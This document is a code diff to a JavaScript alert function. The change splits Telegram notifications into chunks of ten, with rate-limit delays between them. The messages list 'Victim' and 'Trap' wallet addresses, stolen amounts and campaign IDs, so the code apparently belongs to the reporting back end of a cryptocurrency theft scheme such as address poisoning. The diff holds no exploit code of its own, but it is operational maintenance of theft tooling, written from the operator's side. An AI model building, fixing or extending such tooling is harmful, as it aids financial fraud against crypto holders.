@@ -1969,23 +1969,12 @@ async function sendBatchAlert(items, txHash, contractAddress) {
   const firstItem = items[0];
   const campaignId = firstItem.entry?.campaignId;
 
-  const lines = items.map((item, idx) => {
-    const decimals = getDecimals(item.detectedAsset || 'ETH');
-    const amountDisplay = (Number(item.rawValue) / (10 ** decimals)).toFixed(4);
-
-    let icon = item.type === 'counter' ? '🏆' : '🪞';
-    let overrideLabel = '';
-    if (item.type === 'counter' && item.overridden) {
-      overrideLabel = ' *(Auto Overridden)*';
-    }
-
-    const victimUrl = getExplorerUrl(item.victimAddress);
-    const trapUrl = getExplorerUrl(item.trapAddress);
-
-    return `${icon} *${idx + 1}.* (${amountDisplay} ${item.detectedAsset || '?'})${overrideLabel}\n` +
-      `👤 Victim: \`${item.victimAddress}\`\n🔗 ${victimUrl}\n` +
-      `🪤 Trap: \`${item.trapAddress}\`\n🔗 ${trapUrl}`;
-  });
+  // 🚀 CHUNKING FIX: Split into groups of 10 to stay well under Telegram's 4096 char limit
+  const CHUNK_SIZE = 10;
+  const chunks = [];
+  for (let i = 0; i < items.length; i += CHUNK_SIZE) {
+    chunks.push(items.slice(i, i + CHUNK_SIZE));
+  }
 
   const autoCount = items.filter(i => i.type === 'auto').length;
   const counterCount = items.filter(i => i.type === 'counter').length;
@@ -2003,17 +1992,52 @@ async function sendBatchAlert(items, txHash, contractAddress) {
 
   const txUrl = getExplorerUrl(txHash, 'tx');
   const contractUrl = getExplorerUrl(contractAddress);
+  const totalChunks = chunks.length;
 
-  const msg =
-    `⚡ *${typeLabel}* — ${items.length} transfers in 1 TX!${overrideSummary}\n\n` +
-    lines.join('\n\n') +
-    `\n\n📦 Contract: \`${contractAddress}\`\n🔗 ${contractUrl}\n` +
-    `\n🔗 TX: ${txUrl}`;
+  // 🚀 Send a separate message for each chunk
+  for (let chunkIdx = 0; chunkIdx < totalChunks; chunkIdx++) {
+    const chunk = chunks[chunkIdx];
+    const startIdx = chunkIdx * CHUNK_SIZE; // Continuous numbering across messages
 
-  try {
-    await sendAlert(msg, 'success', campaignId);
-  } catch (err) {
-    logger.warn(`[batch] Failed to send batch alert: ${err.message}`);
+    const lines = chunk.map((item, idx) => {
+      const decimals = getDecimals(item.detectedAsset || 'ETH');
+      const amountDisplay = (Number(item.rawValue) / (10 ** decimals)).toFixed(4);
+
+      let icon = item.type === 'counter' ? '🏆' : '🪞';
+      let overrideLabel = '';
+      if (item.type === 'counter' && item.overridden) {
+        overrideLabel = ' *(Auto Overridden)*';
+      }
+
+      const victimUrl = getExplorerUrl(item.victimAddress);
+      const trapUrl = getExplorerUrl(item.trapAddress);
+
+      return `${icon} *${startIdx + idx + 1}.* (${amountDisplay} ${item.detectedAsset || '?'})${overrideLabel}\n` +
+        `👤 Victim: \`${item.victimAddress}\`\n🔗 ${victimUrl}\n` +
+        `🪤 Trap: \`${item.trapAddress}\`\n🔗 ${trapUrl}`;
+    });
+
+    let header = `⚡ *${typeLabel}* — ${items.length} transfers in 1 TX!${overrideSummary}\n`;
+    if (totalChunks > 1) {
+      header += `📄 *Part ${chunkIdx + 1}/${totalChunks}*\n`;
+    }
+    header += '\n';
+
+    const msg =
+      header +
+      lines.join('\n\n') +
+      `\n\n📦 Contract: \`${contractAddress}\`\n🔗 ${contractUrl}\n` +
+      `\n🔗 TX: ${txUrl}`;
+
+    try {
+      await sendAlert(msg, 'success', campaignId);
+      // Small delay between chunks to prevent Telegram API rate limiting
+      if (chunkIdx < totalChunks - 1) {
+        await new Promise(resolve => setTimeout(resolve, 500));
+      }
+    } catch (err) {
+      logger.warn(`[batch] Failed to send batch alert chunk ${chunkIdx + 1}: ${err.message}`);
+    }
   }
 }
 
